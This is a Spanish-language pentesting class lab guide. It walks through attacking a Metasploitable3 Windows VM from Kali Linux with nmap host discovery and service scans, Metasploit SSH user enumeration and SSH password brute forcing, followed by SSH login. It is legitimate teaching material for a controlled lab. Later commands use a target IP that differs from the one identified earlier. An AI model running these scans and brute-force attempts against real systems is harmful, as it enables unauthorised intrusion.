---
title: Clase 03-04 - Pentesting en un Entorno Controlado usando Metasploitable 3
date: 2024-10-03 12:20:00 -0500
categories: [ciberseguridad, pentesting, laboratorio, metasploit, redes y seguridad]
tags: [MITRE ATT&CK, Metasploitable3, Kali Linux, SSH Fuerza Bruta, Nmap, Kill Chain]     # TAG names should always be lowercase
# header-includes:
#     - \usepackage{pdfpages}
---

**LINKS DE LA GRABACIÓN DE LA CLASE**: [Clase 03](https://drive.google.com/file/d/1tbM1LmHAu8VJGTf9TAkIbkcqcxDuRG0h/view?usp=sharing), [Clase 04](https://drive.google.com/file/d/1XAfEo2_aTlIVyf2CKqtlWB2ZAY5agIk2/view?usp=sharing)


# Guía de Laboratorio: Auditoría de Seguridad en un Entorno Controlado usando Metasploitable3

## Resumen del Laboratorio

En esta laboratorio guiado, se llevará a cabo una prueba de pentesting en un entorno controlado con máquinas virtuales (VMs). Se utilizará Kali Linux como máquina atacante y Metasploitable3 como máquina víctima, configurada sobre Windows Server 2008 con el firewall activado. Este laboratorio permite aplicar metodologías de prueba de penetración que simulan una auditoría real, abarcando desde el reconocimiento inicial hasta la explotación básica.

El flujo de ataque sigue las etapas de la cadena de ataque (kill chain) de MITRE ATT&CK, identificando los componentes tangibles en cada fase: Reconocimiento, Escaneo y Enumeración, Acceso Inicial y Explotación.

## Setup

- Atacante: VM Kali Linux con dirección IP 10.0.2.9/24.
- Target: VM Windows Server 2008 con framework Metasploitable 3.
- La configuración Network de las VMs en VirtualBox es en modo `NAT Network`. 

![alt text](/assets/images/setup-lab.png)

## Etapa 1: Reconocimiento

La primera fase consiste en identificar la máquina objetivo dentro de la red y recolectar información básica sobre su configuración.

### 1. Configuración del Segmento de Red

- En nuestra VM Kali Linux ejecutamos el siguiente comando para visualizar la dirección IP asignada para la interfaz virtual de red Ethernet.

```bash
└─$ ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:2e:94:62 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.9/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 569sec preferred_lft 569sec
    inet6 fe80::2655:2243:5e4d:82af/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

- Vemos que la VM de Kali Linux tiene la dirección `10.0.2.9/24`.

- Debido a que la máscara de subred tiene longitud `24`, es decir, es `255.255.255.0`, podemos asumir que el segmento de red es `10.0.2.0/24`.

- Para conocer la dirección IP del metasplotable, ejecutamos `ipconfig`. Tener en cuenta que esta información es referencial y solo la utilizaremos a modo de comprobación. Recordar que el atacante no conoce a primeras cuál es la dirección IP de la VM target.

```bash
PS C:\Users\vagrant> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : .
   Link-local IPv6 Address . . . . . : fe80::3cbb:f6b4:e297:9a67%11
   IPv4 Address. . . . . . . . . . . : 10.0.2.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

Tunnel adapter isatap..:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

- Vemos que la ip para el metasploitable 3 es `10.0.2.15/24`.

### 2. Comando de Escaneo Inicial con Nmap

- Para identificar dispositivos activos en la red, se utiliza Nmap para hacer un escaneo sin resolución de dominio.

```bash
└─$ sudo nmap -sn 10.0.2.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 16:59 PDT
Nmap scan report for 10.0.2.1
Host is up (0.00028s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00025s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00024s latency).
MAC Address: 08:00:27:86:7C:B5 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.15
Host is up (0.00041s latency).
MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.9
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds
```

**Explicación**: El parámetro -sn realiza un escaneo de ping, sin buscar servicios ni puertos abiertos, evitando levantar alertas en los sistemas de firewall y detección de intrusos.

- Vemos que existen las siguientes direcciones:
    - `10.0.2.1`: router virtual que implementa el VirtualBox.
    - `10.0.2.2`: servidor DNS virtual que implementa el VirtualBox.
    - `10.0.2.3`: servidor DHCP virtual implementado por el VirtualBox.

- Concluimos que nuestro target es la dirección ip `10.0.2.15/24`.

### 3. Validación de Puertos Comunes

- Tras identificar la IP activa de la máquina víctima, se realiza un escaneo sobre todos los puertos. Esto incluirá puertos como FTP (21), SSH (22), HTTP (80), y HTTPS (443), para comprobar su accesibilidad.

```bash
sudo nmap -Pn -p- 10.0.2.15
```

**Explicación**: Aquí, -Pn desactiva el ping para evitar bloqueos de firewall, mientras que -p especifica los puertos a auditar. Este paso ayuda a detectar la presencia de un firewall si algunos puertos aparecen como "filtrados".

### 4. Confirmación de Firewall Activo

- Si algunos puertos parecen bloqueados o “filtrados”, se puede confirmar la existencia de un firewall realizando un traceroute.

```bash
traceroute 192.168.122.175
```

**Explicación**: La falta de respuesta después de múltiples saltos puede indicar un firewall que está filtrando el tráfico entrante. Este comportamiento es característico de dispositivos protegidos en redes empresariales.

## Etapa 2: Escaneo y Enumeración

Una vez identificada la máquina objetivo y confirmada la presencia de un firewall, se realiza un análisis más detallado para descubrir servicios específicos y versiones.

1. Escaneo Detallado de Servicios y Versiones con Nmap

- Aquí se ejecuta un escaneo con opciones que permiten identificar el tipo de servicio y su versión.

```bash
sudo nmap -sV -p 22,80 192.168.122.175
```

**Explicación**: La opción -sV permite identificar la versión de los servicios en los puertos activos. Esto proporciona una base para buscar posibles vulnerabilidades conocidas.

2. Identificación de Servicios SSH y FTP

- Si el puerto 22 (SSH) está abierto, se identifica la versión exacta del servicio SSH en ejecución, lo que será crucial para la fase de acceso inicial.

```bash
sudo nmap -sV -p 22 192.168.122.175
```

**Explicación**: Esto permite conocer la versión del servicio SSH, lo cual puede ser útil para verificar vulnerabilidades específicas asociadas a esa versión.

## Etapa 3: Acceso Inicial

Con la información obtenida sobre los servicios en ejecución, se pasa a intentar obtener acceso inicial al sistema a través del servicio SSH.

1. Enumeración de Usuarios con Metasploit

- En esta etapa, se utiliza Metasploit para enumerar usuarios válidos en el servicio SSH del sistema objetivo, lo que es parte de la recolección activa de información.

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.122.175
set USER_FILE /path/to/usernames.txt
run
```

**Explicación**: Este módulo de Metasploit permite enumerar usuarios válidos en el servicio SSH, utilizando una lista de usuarios comunes. La detección de nombres de usuario es esencial para los siguientes intentos de autenticación.

2. Ataque de Fuerza Bruta en SSH

Una vez identificados los usuarios válidos, se utiliza un ataque de fuerza bruta para intentar obtener contraseñas.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.122.175
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

**Explicación**: Este módulo intenta varias combinaciones de usuarios y contraseñas usando un diccionario de contraseñas. Esto puede permitir el acceso inicial al sistema si alguna combinación es correcta.

## Etapa 4: Explotación y Acceso

Tras obtener una combinación de usuario y contraseña válida, se realiza la conexión y la explotación del sistema.

1. Conexión SSH

- Con el usuario y la contraseña obtenidos, se establece una conexión SSH al sistema objetivo.

```bash
ssh usuario@192.168.122.175
```

**Explicación**: Este comando establece una conexión remota al servidor, permitiendo la ejecución de comandos en la máquina comprometida.

2. Escalación de Privilegios (Opcional)

- Si el usuario con el que se accede no tiene privilegios administrativos, se puede proceder a buscar técnicas de escalación de privilegios mediante exploits o configuraciones inseguras.

**Explicación**: La escalación de privilegios es una etapa avanzada y opcional, dependiendo de los permisos iniciales obtenidos en la máquina.

## Conclusión y Recomendaciones

Este laboratorio guiado ha cubierto las principales etapas de la cadena de ataque de MITRE ATT&CK en un entorno simulado, pasando por reconocimiento, escaneo, acceso inicial y explotación básica. Esta práctica proporciona experiencia en la identificación de servicios, evasión de firewall, recolección de información mediante enumeración y obtención de acceso mediante fuerza bruta en SSH. Los pasos aquí seguidos permiten desarrollar habilidades esenciales para el pentesting en entornos empresariales.